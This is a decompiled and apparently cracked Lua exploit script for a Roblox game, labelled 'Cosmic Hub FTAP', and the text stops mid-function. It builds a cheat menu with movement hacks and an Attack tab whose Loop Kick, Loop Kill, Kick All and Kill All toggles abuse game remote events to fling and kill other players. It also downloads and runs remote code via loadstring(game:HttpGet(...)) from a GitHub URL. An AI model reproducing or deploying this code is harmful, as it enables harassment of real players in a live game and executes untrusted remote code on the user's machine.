--crack by:magfun_legend
MoonSec_StringsHiddenAttr = true;
if _wURGUJXwOJhV == "This file was protected with MoonSec V3" then
    local l_Players_0 = game:GetService("Players");
    local l_LocalPlayer_0 = l_Players_0.LocalPlayer;
    local l_RunService_0 = game:GetService("RunService");
    local l_HttpService_0 = game:GetService("HttpService");
    local l_ReplicatedStorage_0 = game:GetService("ReplicatedStorage");
    local _ = game:GetService("Debris");
    local l_GrabEvents_0 = l_ReplicatedStorage_0:WaitForChild("GrabEvents");
    local _ = l_ReplicatedStorage_0:WaitForChild("CharacterEvents");
    local _ = l_ReplicatedStorage_0:WaitForChild("MenuToys");
    local l_SetNetworkOwner_0 = l_GrabEvents_0:WaitForChild("SetNetworkOwner");
    local _ = game:GetService("StarterGui");
    local l_TextChatService_0 = game:GetService("TextChatService");
    if not l_Players_0.LocalPlayer and not l_Players_0:GetPropertyChangedSignal("LocalPlayer"):Wait() then
        local _ = l_Players_0.LocalPlayer;
    end;
    local l_RagdollRemote_0 = l_ReplicatedStorage_0:WaitForChild("CharacterEvents"):FindFirstChild("RagdollRemote");
    local v14 = false;
    local _ = nil;
    local _ = 40;
    local _ = nil;
    local _ = nil;
    local _ = nil;
    local _ = nil;
    if not l_LocalPlayer_0.Character then
        local _ = l_LocalPlayer_0.CharacterAdded:Wait();
    end;
    local _ = workspace:FindFirstChild(l_LocalPlayer_0.Name .. "SpawnedInToys");
    local l_LocalPlayer_2 = l_Players_0.LocalPlayer;
    local l_Workspace_0 = game:GetService("Workspace");
    (_G or {}).BlobmanDelay = 5.0E-8;
    local v25 = 1;
    local _ = {};
    local v27 = nil;
    local v28 = {};
    local _ = nil;
    local function v33()
        -- upvalues: l_Players_0 (ref)
        local v30 = {};
        for _, v32 in ipairs(l_Players_0:GetPlayers()) do
            table.insert(v30, v32.Name);
        end;
        return v30;
    end;
    local function v37()
        -- upvalues: v33 (ref), v28 (ref)
        local v34 = v33();
        for _, v36 in ipairs(v28) do
            v36:Refresh(v34, true);
        end;
    end;
    l_Players_0.PlayerAdded:Connect(v37);
    l_Players_0.PlayerRemoving:Connect(v37);
    local function v39(v38)
        -- upvalues: v28 (ref), v33 (ref)
        table.insert(v28, v38);
        v38:Refresh(v33(), true);
    end;
    local v40 = nil;
    l_Players_0.PlayerAdded:Connect(function()
        -- upvalues: v40 (ref), v33 (ref)
        if v40 then
            v40:Refresh(v33(), true);
        end;
    end);
    l_Players_0.PlayerRemoving:Connect(function()
        -- upvalues: v40 (ref), v33 (ref)
        if v40 then
            v40:Refresh(v33(), true);
        end;
    end);
    local function v42(v41)
        -- upvalues: l_TextChatService_0 (ref), l_ReplicatedStorage_0 (ref)
        if l_TextChatService_0.ChatVersion == Enum.ChatVersion.TextChatService then
            l_TextChatService_0.TextChannels.RBXGeneral:SendAsync(v41);
        else
            l_ReplicatedStorage_0.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(v41, "All");
        end;
    end;
    task.spawn(function()
        -- upvalues: v42 (ref)
        v42("-`C\194\180-");
    end);
    local v43 = loadstring(game:HttpGet("https://raw.githubusercontent.com/Jeffepicy/OrionGod/refs/heads/main/CosmicOrion", true))();
    v43:MakeNotification({
        Name = "Welcome to Cosmic Hub!", 
        Content = "You\226\128\153re Whitelisted! wink wink", 
        Image = "rbxassetid://4483345998", 
        Time = 20
    });
    local v44 = v43:MakeWindow({
        Name = "Cosmic Hub FTAP", 
        HidePremium = false, 
        SaveConfig = true, 
        ConfigFolder = "CosmicHubFTAPConfig"
    });
    local v45 = v44:MakeTab({
        Name = "Player", 
        Icon = "rbxassetid://6031075927", 
        PremiumOnly = false
    });
    local _ = v45:AddSection({
        Name = "Movement"
    });
    local v47 = {
        Walkspeed = false, 
        WalkspeedValue = 5, 
        InfiniteJump = false, 
        InfiniteJumpPower = 100, 
        Noclip = false, 
        Connections = {}
    };
    local l_UserInputService_0 = game:GetService("UserInputService");
    v47.WalkspeedFunc = function()
        -- upvalues: v47 (ref), l_RunService_0 (ref), l_Players_0 (ref)
        if v47.Connections.WS then
            v47.Connections.WS:Disconnect();
        end;
        if v47.Walkspeed then
            v47.Connections.WS = l_RunService_0.Stepped:Connect(function()
                -- upvalues: l_Players_0 (ref), v47 (ref)
                p = l_Players_0.LocalPlayer;
                if p and p.Character and p.Character:FindFirstChild("HumanoidRootPart") and p.Character:FindFirstChildOfClass("Humanoid") and typeof(v47.WalkspeedValue) == "number" then
                    h = p.Character.HumanoidRootPart;
                    u = p.Character:FindFirstChildOfClass("Humanoid");
                    h.CFrame = h.CFrame + u.MoveDirection * (16 * v47.WalkspeedValue / 10);
                end;
            end);
        end;
    end;
    v47.InfiniteJumpFunc = function()
        -- upvalues: v47 (ref), l_UserInputService_0 (ref), l_Players_0 (ref)
        if v47.Connections.JP then
            v47.Connections.JP:Disconnect();
        end;
        if v47.InfiniteJump then
            v47.Connections.JP = l_UserInputService_0.JumpRequest:Connect(function()
                -- upvalues: l_Players_0 (ref), v47 (ref)
                local l_LocalPlayer_3 = l_Players_0.LocalPlayer;
                if l_LocalPlayer_3 and l_LocalPlayer_3.Character and l_LocalPlayer_3.Character:FindFirstChildOfClass("Humanoid") then
                    local l_Humanoid_0 = l_LocalPlayer_3.Character:FindFirstChildOfClass("Humanoid");
                    l_Humanoid_0:ChangeState(Enum.HumanoidStateType.Freefall);
                    task.wait();
                    l_Humanoid_0:ChangeState(Enum.HumanoidStateType.Jumping);
                    if l_Humanoid_0.UseJumpPower == false then
                        l_Humanoid_0.JumpHeight = math.clamp(v47.InfiniteJumpPower / 10, 7.2, 50);
                    else
                        l_Humanoid_0.JumpPower = v47.InfiniteJumpPower;
                    end;
                end;
            end);
        end;
    end;
    v47.NoclipFunc = function()
        -- upvalues: v47 (ref), l_RunService_0 (ref), l_Players_0 (ref)
        if v47.Connections.NC then
            v47.Connections.NC:Disconnect();
        end;
        if v47.Noclip then
            v47.Connections.NC = l_RunService_0.Stepped:Connect(function()
                -- upvalues: l_Players_0 (ref)
                p = l_Players_0.LocalPlayer;
                if p and p.Character then
                    for _, v52 in ipairs(p.Character:GetDescendants()) do
                        if v52:IsA("BasePart") then
                            v52.CanCollide = false;
                        end;
                    end;
                end;
            end);
        end;
    end;
    v45:AddToggle({
        Name = "Walkspeed", 
        Default = false, 
        Callback = function(v53)
            -- upvalues: v47 (ref)
            v47.Walkspeed = v53;
            v47.WalkspeedFunc();
        end
    });
    v45:AddSlider({
        Name = "Speed Multiplier", 
        Min = 1, 
        Max = 5, 
        Default = 0.1, 
        Increment = 0.1, 
        Callback = function(v54)
            -- upvalues: v47 (ref)
            v47.WalkspeedValue = v54;
        end
    });
    v45:AddToggle({
        Name = "Infinite Jump", 
        Default = false, 
        Callback = function(v55)
            -- upvalues: v47 (ref)
            v47.InfiniteJump = v55;
            v47.InfiniteJumpFunc();
        end
    });
    v45:AddSlider({
        Name = "Jump Power", 
        Min = 16, 
        Max = 500, 
        Default = 16, 
        Increment = 1, 
        Callback = function(v56)
            -- upvalues: v47 (ref)
            v47.InfiniteJumpPower = v56;
        end
    });
    v45:AddToggle({
        Name = "Noclip", 
        Default = false, 
        Callback = function(v57)
            -- upvalues: v47 (ref)
            v47.Noclip = v57;
            v47.NoclipFunc();
        end
    });
    local v58 = v44:MakeTab({
        Name = "Invincibility", 
        Icon = "rbxassetid://4483362458", 
        PremiumOnly = false
    });
    local _ = v58:AddSection({
        Name = "Anti"
    });
    local function v63()
        -- upvalues: l_RagdollRemote_0 (ref), v43 (ref), l_Players_0 (ref)
        if l_RagdollRemote_0 then
            for _, v61 in pairs(l_Players_0:GetPlayers()) do
                if v61.Character and v61.Character:FindFirstChild("HumanoidRootPart") then
                    for _ = 1, 150 do
                        l_RagdollRemote_0:FireServer(v61.Character.HumanoidRootPart, 9999999);
                        wait();
                    end;
                end;
            end;
            return;
        else
            v43:MakeNotification({
                Name = "Error", 
                Content = "error", 
                Image = "rbxassetid://4483345998", 
                Time = 3
            });
            return;
        end;
    end;
    v58:AddButton({
        Name = "Anti Ragdoll/Snowball", 
        Callback = function()
            -- upvalues: v63 (ref)
            v63();
        end
    });
    v58:AddButton({
        Name = "Destroy Void", 
        Callback = function()
            -- upvalues: l_Workspace_0 (ref)
            l_Workspace_0.FallenPartsDestroyHeight = -1.0E95;
        end
    });
    local v64 = {
        Players = game:GetService("Players"), 
        ReplicatedStorage = game:GetService("ReplicatedStorage"), 
        RunService = game:GetService("RunService"), 
        LP = game.Players.LocalPlayer
    };
    v64.spawnGucci = function()
        -- upvalues: v64 (ref)
        return v64.ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer("CreatureBlobman", CFrame.new(0, 50000, 0) * CFrame.Angles(-0.7351, 0.9028, 0.6173), Vector3.new(0, 59.667, 0));
    end;
    v64.setup = function()
        -- upvalues: v64 (ref), l_Workspace_0 (ref)
        v64.spawnGucci();
        local l_Name_0 = v64.LP.Name;
        local l_l_Workspace_0_0 = l_Workspace_0;
        local v67 = v64.LP.Character or v64.LP.CharacterAdded:Wait();
        local l_l_l_Workspace_0_0_FirstChild_0 = l_l_Workspace_0_0:FindFirstChild(l_Name_0 .. "SpawnedInToys");
        local v69 = nil;
        local v70 = nil;
        if l_l_l_Workspace_0_0_FirstChild_0 then
            v69 = l_l_l_Workspace_0_0_FirstChild_0:FindFirstChild("CreatureBlobman");
        end;
        if v69 then
            v70 = v69.FindFirstChild(v69, "Head");
        end;
        if v70 then
            v70.CFrame = CFrame.new(0, 50000, 0);
            v70.Anchored = true;
        end;
        task.wait(0.1);
        local l_Humanoid_1 = v67:WaitForChild("Humanoid");
        local l_HumanoidRootPart_0 = v67:WaitForChild("HumanoidRootPart");
        local l_Position_0 = l_HumanoidRootPart_0.Position;
        local v74 = false;
        local v75;
        if v69 then
            v75 = v69.FindFirstChild(v69, "VehicleSeat");
        else
            v75 = v69;
        end;
        if v75 and v75.IsA(v75, "VehicleSeat") then
            l_HumanoidRootPart_0.CFrame = v75.CFrame + Vector3.new(0, 2, 0);
            v75.Sit(v75, l_Humanoid_1);
            v74 = true;
        end;
        l_Humanoid_1:GetPropertyChangedSignal("Jump"):Connect(function()
            -- upvalues: v74 (ref), l_Humanoid_1 (ref), l_HumanoidRootPart_0 (ref), l_Position_0 (ref)
            if v74 and l_Humanoid_1.Jump then
                task.wait(0.02);
                l_HumanoidRootPart_0.CFrame = CFrame.new(l_Position_0);
                v74 = false;
            end;
        end);
        v64.ragdollConn = v64.RunService.Heartbeat:Connect(function()
            -- upvalues: v64 (ref), v74 (ref), l_l_Workspace_0_0 (ref), l_Name_0 (ref)
            if v64.enabled and v74 then
                pcall(function()
                    -- upvalues: v64 (ref), l_l_Workspace_0_0 (ref), l_Name_0 (ref)
                    v64.ReplicatedStorage.CharacterEvents.RagdollRemote:FireServer(l_l_Workspace_0_0[l_Name_0].HumanoidRootPart, 0);
                end);
            end;
        end);
        v64.posCheckConn = v64.RunService.Heartbeat:Connect(function()
            -- upvalues: v64 (ref), l_HumanoidRootPart_0 (ref), l_Position_0 (ref), v74 (ref)
            if v64.enabled and (l_HumanoidRootPart_0.Position - l_Position_0).Magnitude < 1 then
                v74 = false;
            end;
        end);
    end;
    v58:AddToggle({
        Name = " Gucci Anti", 
        Default = false, 
        Callback = function(v76)
            -- upvalues: v64 (ref)
            v64.enabled = v76;
            if not v76 then
                if v64.ragdollConn then
                    v64.ragdollConn:Disconnect();
                    v64.ragdollConn = "Disconnect";
                end;
                if v64.posCheckConn then
                    v64.posCheckConn:Disconnect();
                    v64.posCheckConn = "posCheckConn";
                end;
            else
                v64.setup();
            end;
        end
    });
    v58:AddButton({
        Name = "Destroy Gucci (All)", 
        Callback = function()
            -- upvalues: l_Workspace_0 (ref)
            for _, v78 in l_Workspace_0:GetDescendants() do
                if v78.Name == "CreatureBlobman" then
                    v78.VehicleSeat:Sit(game.Players.LocalPlayer.Character.Humanoid);
                    wait(0.05);
                    game.Players.LocalPlayer.Character.Humanoid.Jump = true;
                end;
            end;
        end
    });
    local v79 = false;
    local function v82()
        -- upvalues: v79 (ref), l_LocalPlayer_2 (ref), l_ReplicatedStorage_0 (ref)
        while v79 and task.wait() do
            if l_LocalPlayer_2:FindFirstChild("IsHeld") and l_LocalPlayer_2.IsHeld.Value == true then
                local l_Character_0 = l_LocalPlayer_2.Character;
                if l_Character_0 then
                    local l_HumanoidRootPart_1 = l_Character_0:FindFirstChild("HumanoidRootPart");
                    if l_HumanoidRootPart_1 then
                        l_HumanoidRootPart_1.Anchored = true;
                        while l_LocalPlayer_2.IsHeld.Value == true and v79 do
                            l_ReplicatedStorage_0.CharacterEvents.Struggle:FireServer(l_LocalPlayer_2);
                            task.wait(0.001);
                        end;
                        l_HumanoidRootPart_1.Anchored = false;
                    end;
                end;
            end;
        end;
    end;
    v58:AddToggle({
        Name = "Anti Grab", 
        Default = false, 
        Callback = function(v83)
            -- upvalues: v79 (ref), v82 (ref)
            v79 = v83;
            if v79 then
                task.spawn(v82);
            end;
        end
    });
    local v84 = false;
    local function v89()
        -- upvalues: l_Workspace_0 (ref), v84 (ref), l_LocalPlayer_2 (ref)
        l_Workspace_0.ChildAdded:Connect(function(v85)
            -- upvalues: v84 (ref), l_LocalPlayer_2 (ref)
            if v85:IsA("Part") and v85.Name == "Part" and v84 then
                local l_Character_1 = l_LocalPlayer_2.Character;
                if l_Character_1 then
                    local l_HumanoidRootPart_2 = l_Character_1:FindFirstChild("HumanoidRootPart");
                    local l_l_Character_1_FirstChild_0 = l_Character_1:FindFirstChild("Right Arm");
                    if l_HumanoidRootPart_2 and l_l_Character_1_FirstChild_0 and (v85.Position - l_HumanoidRootPart_2.Position).Magnitude <= 20 then
                        l_HumanoidRootPart_2.Anchored = true;
                        task.wait(0.01);
                        while l_l_Character_1_FirstChild_0:FindFirstChild("RagdollLimbPart") and l_l_Character_1_FirstChild_0.RagdollLimbPart.CanCollide == true do
                            task.wait(0.001);
                        end;
                        l_HumanoidRootPart_2.Anchored = false;
                    end;
                end;
            end;
        end);
    end;
    v58:AddToggle({
        Name = "Anti Explode", 
        Default = false, 
        Callback = function(v90)
            -- upvalues: v84 (ref), v89 (ref)
            v84 = v90;
            if v84 then
                task.spawn(v89);
            end;
        end
    });
    v58:AddToggle({
        Name = "Anti Fire", 
        Default = false, 
        Callback = function(v91)
            local v92 = {
                p = game:GetService("Players").LocalPlayer, 
                rs = game:GetService("RunService"), 
                w = game:GetService("Workspace"), 
                mon = false, 
                con = "con"
            };
            v92.ep = v92.w.Map.Hole.PoisonBigHole.ExtinguishPart;
            v92.op = v92.ep.Position;
            local function v96()
                -- upvalues: v92 (ref)
                local l_HumanoidRootPart_3 = (v92.p.Character or v92.p.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart");
                local l_FireLight_0 = l_HumanoidRootPart_3:FindFirstChild("FireLight");
                local l_FireParticleEmitter_0 = l_HumanoidRootPart_3:FindFirstChild("FireParticleEmitter");
                if l_FireLight_0 or l_FireParticleEmitter_0 then
                    v92.ep.CFrame = CFrame.new(l_HumanoidRootPart_3.Position);
                    while l_FireLight_0 or l_FireParticleEmitter_0 do
                        task.wait(0.1);
                        l_FireLight_0 = l_HumanoidRootPart_3:FindFirstChild("FireLight");
                        l_FireParticleEmitter_0 = l_HumanoidRootPart_3:FindFirstChild("FireParticleEmitter");
                        v92.ep.CFrame = CFrame.new(l_HumanoidRootPart_3.Position);
                    end;
                    v92.ep.CFrame = CFrame.new(v92.op);
                end;
            end;
            v92.mon = v91;
            if v91 then
                if not v92.con then
                    v92.con = v92.rs.Heartbeat:Connect(function()
                        -- upvalues: v92 (ref), v96 (ref)
                        if v92.mon then
                            v96();
                        end;
                    end);
                end;
            else
                v92.ep.CFrame = CFrame.new(v92.op);
                if v92.con then
                    v92.con:Disconnect();
                    v92.con = "Disconnect";
                end;
            end;
        end
    });
    local function v101()
        local l_Character_2 = game.Players.LocalPlayer.Character;
        if l_Character_2 then
            local l_HumanoidRootPart_4 = l_Character_2:FindFirstChild("HumanoidRootPart");
            local l_Humanoid_2 = l_Character_2:FindFirstChild("Humanoid");
            local v100 = game.Players.LocalPlayer:FindFirstChild("PlayerScripts") and game.Players.LocalPlayer.PlayerScripts:FindFirstChild("CharacterAndBeamMove");
            if l_HumanoidRootPart_4 and l_Humanoid_2 and v100 then
                v100.Disabled = antiLagT;
            end;
        end;
    end;
    v58:AddToggle({
        Name = "Anti Lag", 
        Default = false, 
        Callback = function(v102)
            -- upvalues: v101 (ref)
            antiLagT = v102;
            v101();
        end
    });
    local function v107()
        -- upvalues: l_LocalPlayer_0 (ref), l_Workspace_0 (ref)
        local l_Character_3 = l_LocalPlayer_0.Character;
        if l_Character_3 then
            local l_HumanoidRootPart_5 = l_Character_3:FindFirstChild("HumanoidRootPart");
            if l_HumanoidRootPart_5 then
                for _, v106 in pairs(l_Workspace_0:GetDescendants()) do
                    if v106:IsA("BasePart") and (v106.Name == "LeftDetector" or v106.Name == "RightDetector") and (l_HumanoidRootPart_5.Position - v106.Position).Magnitude > 10 then
                        v106:Destroy();
                    end;
                end;
                return;
            else
                return;
            end;
        else
            return;
        end;
    end;
    local function v110()
        -- upvalues: v14 (ref), l_LocalPlayer_0 (ref)
        while v14 do
            if l_LocalPlayer_0.Character then
                for _, v109 in ipairs(l_LocalPlayer_0.Character:GetDescendants()) do
                    if v109:IsA("BasePart") and v109.Massless then
                        v109.Massless = false;
                    end;
                end;
            end;
            task.wait(1);
        end;
    end;
    v58:AddToggle({
        Name = "Anti Blobman", 
        Default = false, 
        Callback = function(v111)
            -- upvalues: v14 (ref), v107 (ref), v110 (ref)
            v14 = v111;
            if v14 then
                task.spawn(function()
                    -- upvalues: v14 (ref), v107 (ref)
                    while v14 do
                        v107();
                        task.wait(1);
                    end;
                end);
                task.spawn(v110);
            end;
        end
    });
    local v112 = v44:MakeTab({
        Name = "Attack", 
        Icon = "rbxassetid://6031094674", 
        PremiumOnly = false
    });
    local _ = v112:AddSection({
        Name = "Loop "
    });
    local l_Players_1 = game:GetService("Players");
    local l_RunService_1 = game:GetService("RunService");
    local l_l_Workspace_0_1 = l_Workspace_0;
    local l_ReplicatedStorage_1 = game.ReplicatedStorage;
    local l_LocalPlayer_4 = l_Players_1.LocalPlayer;
    local v119 = {};
    local v120 = nil;
    local v121 = {
        E = false, 
        S = "S", 
        D = 2, 
        Off = Vector3.new(5, -18.5, 0), 
        H = 10000, 
        Del = 0.5
    };
    local v122 = {
        E = false, 
        S = 0.5, 
        D = 2, 
        Off = Vector3.new(5, -18.5, 0), 
        H = 10000, 
        Del = 0.5
    };
    local function v127(v123)
        -- upvalues: l_Players_1 (ref)
        local v124 = {};
        for _, v126 in ipairs(l_Players_1:GetPlayers()) do
            table.insert(v124, v126.Name);
        end;
        v123:Refresh(v124, true);
    end;
    local function v131(v128)
        for _, v130 in ipairs(v128:GetDescendants()) do
            if v130:IsA("BasePart") then
                v130.CanCollide = false;
            end;
        end;
    end;
    local function v136(v132, v133)
        -- upvalues: v131 (ref)
        v131(v133.Parent);
        local v134 = Instance.new("BodyVelocity", v132);
        local v135 = Vector3.new(0, 1000000000, 0);
        v134.MaxForce = Vector3.new(math.huge, math.huge, math.huge);
        v134.Velocity = v135;
        v135 = false;
        v133.Jump = true;
        v133.Sit = v135;
        task.delay(3, function()
            -- upvalues: v134 (ref)
            if v134.Parent then
                v134:Destroy();
            end;
        end);
    end;
    local function v141(v137, v138)
        local v139 = v137.Character and v137.Character:FindFirstChild("HumanoidRootPart");
        if v139 and v138 >= v139.Position.Y then
            local _ = false;
        end;
        return true;
    end;
    local function v144(v142)
        -- upvalues: l_LocalPlayer_4 (ref)
        local l_Character_4 = l_LocalPlayer_4.Character;
        if l_Character_4 and l_Character_4:FindFirstChild("HumanoidRootPart") then
            v142.S = l_Character_4:GetPivot();
        end;
    end;
    local function v148(v145)
        -- upvalues: l_LocalPlayer_4 (ref)
        local l_Character_5 = l_LocalPlayer_4.Character;
        local v147 = l_Character_5 and l_Character_5:FindFirstChild("HumanoidRootPart");
        if v147 and v145.S and (v147.Position - v145.S.Position).Magnitude > v145.D then
            l_Character_5:PivotTo(v145.S);
        end;
    end;
    local function v157(v149, v150, v151)
        -- upvalues: l_l_Workspace_0_1 (ref), v141 (ref), l_LocalPlayer_4 (ref), v144 (ref), v131 (ref), l_ReplicatedStorage_1 (ref), v148 (ref), v136 (ref)
        if not v150.E then
            return;
        elseif not l_l_Workspace_0_1:FindFirstChild("PlotItems") or not l_l_Workspace_0_1.PlotItems.PlayersInPlots:FindFirstChild(v149.Name) then
            local l_Character_6 = v149.Character;
            local v153 = l_Character_6 and l_Character_6:FindFirstChild("HumanoidRootPart");
            local v154 = l_Character_6 and l_Character_6:FindFirstChildOfClass("Humanoid");
            local v155 = l_Character_6 and l_Character_6:FindFirstChild("Head");
            if v153 and v154 and v155 and v154.Health > 0 and not v141(v149, v150.H) then
                local l_Character_7 = l_LocalPlayer_4.Character;
                if not (l_Character_7 and l_Character_7:FindFirstChild("HumanoidRootPart")) then
                    return;
                else
                    pcall(function()
                        -- upvalues: v144 (ref), v150 (ref), l_Character_7 (ref), v153 (ref), v131 (ref), l_Character_6 (ref), l_ReplicatedStorage_1 (ref), v148 (ref), v155 (ref), l_LocalPlayer_4 (ref), v136 (ref), v154 (ref), v151 (ref)
                        v144(v150);
                        l_Character_7:PivotTo(CFrame.new(v153.Position + v150.Off));
                        v131(l_Character_6);
                        l_ReplicatedStorage_1.GrabEvents.SetNetworkOwner:FireServer(v153, v153.CFrame);
                        task.wait();
                        v148(v150);
                        task.wait(0.1);
                        l_ReplicatedStorage_1.GrabEvents.DestroyGrabLine:FireServer(v153);
                        task.wait(0.1);
                        if v155:FindFirstChild("PartOwner") and v155.PartOwner.Value == l_LocalPlayer_4.Name then
                            v136(v153, v154);
                            if v151 then
                                task.wait(0.1);
                                v154.Health = 0;
                            end;
                        end;
                    end);
                    task.wait(v150.Del);
                    return;
                end;
            else
                return;
            end;
        else
            return;
        end;
    end;
    local function v162(v158, v159)
        -- upvalues: v144 (ref), v119 (ref), l_Players_1 (ref), v157 (ref)
        v144(v158);
        for v160 in pairs(v119) do
            if v158.E then
                local l_l_Players_1_FirstChild_0 = l_Players_1:FindFirstChild(v160);
                if l_l_Players_1_FirstChild_0 then
                    v157(l_l_Players_1_FirstChild_0, v158, v159);
                end;
            else
                break;
            end;
        end;
    end;
    local function v165(v163, v164)
        -- upvalues: l_RunService_1 (ref), v162 (ref)
        return (l_RunService_1.Heartbeat:Connect(function()
            -- upvalues: v163 (ref), v162 (ref), v164 (ref)
            if v163.E then
                v162(v163, v164);
            end;
        end));
    end;
    local v166 = nil;
    local v167 = nil;
    local v168 = nil;
    local v169 = nil;
    local function v172(v170, v171)
        v171.E = false;
        if v170 then
            v170:Disconnect();
        end;
        v171.S = "S";
    end;
    SelectDropdown = v112:AddDropdown({
        Name = "Select Player", 
        Options = {}, 
        Callback = function(v173)
            -- upvalues: v120 (ref), l_Players_1 (ref)
            v120 = l_Players_1:FindFirstChild(v173);
        end
    });
    LoopDropdown = v112:AddDropdown({
        Name = "Players in Loop", 
        Options = {}, 
        Callback = function(v174)
            -- upvalues: v120 (ref), l_Players_1 (ref)
            v120 = l_Players_1:FindFirstChild(v174);
        end
    });
    v112:AddButton({
        Name = "Add Player", 
        Callback = function()
            -- upvalues: v120 (ref), v119 (ref), v127 (ref)
            if v120 and not v119[v120.Name] then
                v119[v120.Name] = true;
                v127(LoopDropdown);
            end;
        end
    });
    v112:AddButton({
        Name = "Remove Player", 
        Callback = function()
            -- upvalues: v120 (ref), v119 (ref), v127 (ref)
            if v120 and v119[v120.Name] then
                v119[v120.Name] = "Name";
                v120 = nil;
                v127(SelectDropdown);
                v127(LoopDropdown);
            end;
        end
    });
    v112:AddToggle({
        Name = "Loop Kick", 
        Callback = function(v175)
            -- upvalues: v121 (ref), v166 (ref), v165 (ref), v172 (ref)
            v121.E = v175;
            if not v175 then
                v172(v166, v121);
            else
                v166 = v165(v121, false);
            end;
        end
    });
    v112:AddToggle({
        Name = "Loop Kill", 
        Callback = function(v176)
            -- upvalues: v122 (ref), v167 (ref), v165 (ref), v172 (ref)
            v122.E = v176;
            if v176 then
                v167 = v165(v122, true);
            else
                v172(v167, v122);
            end;
        end
    });
    l_Players_1.PlayerAdded:Connect(function()
        -- upvalues: v127 (ref)
        v127(SelectDropdown);
    end);
    l_Players_1.PlayerRemoving:Connect(function(v177)
        -- upvalues: v119 (ref), v127 (ref)
        if v119[v177.Name] then
            v119[v177.Name] = "Name";
            v127(LoopDropdown);
        end;
        v127(SelectDropdown);
    end);
    v127(SelectDropdown);
    v127(LoopDropdown);
    v112:AddToggle({
        Name = "Kick All", 
        Callback = function(v178)
            -- upvalues: v172 (ref), v166 (ref), v121 (ref), v168 (ref), l_RunService_1 (ref), v144 (ref), l_Players_1 (ref), l_LocalPlayer_4 (ref), v157 (ref)
            if not v178 then
                v172(v168, v121);
            else
                v172(v166, v121);
                v168 = l_RunService_1.Heartbeat:Connect(function()
                    -- upvalues: v144 (ref), v121 (ref), l_Players_1 (ref), l_LocalPlayer_4 (ref), v157 (ref)
                    v144(v121);
                    for _, v180 in ipairs(l_Players_1:GetPlayers()) do
                        if v180 ~= l_LocalPlayer_4 then
                            v157(v180, v121, false);
                        end;
                    end;
                end);
            end;
        end
    });
    v112:AddToggle({
        Name = "Kill All", 
        Callback = function(v181)
            -- upvalues: v172 (ref), v167 (ref), v122 (ref), v169 (ref), l_RunService_1 (ref), v144 (ref), l_Players_1 (ref), l_LocalPlayer_4 (ref), v157 (ref)
            if v181 then
                v172(v167, v122);
                v169 = l_RunService_1.Heartbeat:Connect(function()
                    -- upvalues: v144 (ref), v122 (ref), l_Players_1 (ref), l_LocalPlayer_4 (ref), v157 (ref)
                    v144(v122);
                    for _, v183 in ipairs(l_Players_1:GetPlayers()) do
                        if v183 ~= l_LocalPlayer_4 then
                            v157(v183, v122, true);
                        end;
                    end;
                end);
            else
                v172(v169, v122);
            end;
        end
    });
    local _ = v112:AddSection({
        Name = "Grabs"
    });
    local v185 = false;
    local function v190()
        -- upvalues: v185 (ref), l_Workspace_0 (ref), l_LocalPlayer_2 (ref)
        if not v185 then
            return;
        else
            l_Workspace_0.ChildAdded:Connect(function(v186)
                -- upvalues: v185 (ref), l_LocalPlayer_2 (ref)
                if v186:IsA("Model") and v186.Name == "GrabParts" and v185 then
                    local l_GrabPart_0 = v186:FindFirstChild("GrabPart");
                    if l_GrabPart_0 and l_GrabPart_0:FindFirstChild("WeldConstraint") then
                        local l_Part1_0 = l_GrabPart_0.WeldConstraint.Part1;
                        if l_Part1_0 and l_Part1_0.Parent and l_Part1_0.Parent ~= l_LocalPlayer_2.Character then
                            local l_Humanoid_3 = l_Part1_0.Parent:FindFirstChildOfClass("Humanoid");
                            if l_Humanoid_3 then
                                l_Humanoid_3.Health = 0;
                            end;
                        end;
                    end;
                end;
            end);
            return;
        end;
    end;
    v112:AddToggle({
        Name = "Kill Grab", 
        Default = false, 
        Callback = function(v191)
            -- upvalues: v185 (ref), v190 (ref)
            v185 = v191;
            v190();
        end
    });
    local v192 = {
        S = game:GetService("UserInputService"), 
        A = game:GetService("ContextActionService"), 
        W = game:GetService("Workspace"), 
        R = game:GetService("RunService"), 
        D = game:GetService("Debris"), 
        P = game:GetService("Players"), 
        Enabled = false, 
        Strength = 800, 
        UI = {}
    };
    local function v204(v193)
        -- upvalues: v192 (ref)
        if not v192.Enabled then
            return;
        elseif v193.Name ~= "GrabParts" then
            return;
        else
            local l_GrabPart_1 = v193:FindFirstChild("GrabPart");
            if not l_GrabPart_1 or not l_GrabPart_1:FindFirstChild("WeldConstraint") then
                return;
            else
                local l_Part1_1 = l_GrabPart_1.WeldConstraint.Part1;
                if not l_Part1_1 then
                    return;
                else
                    local l_BodyVelocity_0 = Instance.new("BodyVelocity");
                    l_BodyVelocity_0.MaxForce = Vector3.new(0, 0, 0);
                    l_BodyVelocity_0.Parent = l_Part1_1;
                    local v197 = nil;
                    local v198 = nil;
                    local v199 = nil;
                    local v200 = nil;
                    while not v197 and v193.Parent and v192.Enabled do
                        for _, v202 in pairs(v192.P.LocalPlayer.PlayerGui.ContextActionGui:GetDescendants()) do
                            if v202:IsA("ImageLabel") and v202.Image == "http://www.roblox.com/asset/?id=9603678090" then
                                v197 = v202.Parent;
                                break;
                            end;
                        end;
                        v192.R.Heartbeat:Wait();
                    end;
                    if v197 and v192.Enabled then
                        local function v203()
                            -- upvalues: l_BodyVelocity_0 (ref), v192 (ref)
                            l_BodyVelocity_0.MaxForce = Vector3.new(math.huge, math.huge, math.huge);
                            l_BodyVelocity_0.Velocity = v192.W.CurrentCamera.CFrame.LookVector * v192.Strength;
                        end;
                        v198 = v197.MouseButton1Up:Connect(v203);
                        v199 = v197.MouseButton1Down:Connect(v203);
                    end;
                    v200 = v193:GetPropertyChangedSignal("Parent"):Connect(function()
                        -- upvalues: v193 (ref), v198 (ref), v199 (ref), v200 (ref), v192 (ref), l_BodyVelocity_0 (ref)
                        if not v193.Parent then
                            if v198 then
                                v198:Disconnect();
                            end;
                            if v199 then
                                v199:Disconnect();
                            end;
                            if v200 then
                                v200:Disconnect();
                            end;
                            v192.D:AddItem(l_BodyVelocity_0, 1);
                        end;
                    end);
                    return;
                end;
            end;
        end;
    end;
    local function v206(v205)
        -- upvalues: v192 (ref), v204 (ref)
        if not v205 then
            if v192.GrabConn then
                v192.GrabConn:Disconnect();
                v192.GrabConn = "Disconnect";
            end;
        else
            v192.GrabConn = v192.W.ChildAdded:Connect(v204);
        end;
    end;
    v112:AddToggle({
        Name = "Strength", 
        Default = false, 
        Callback = function(v207)
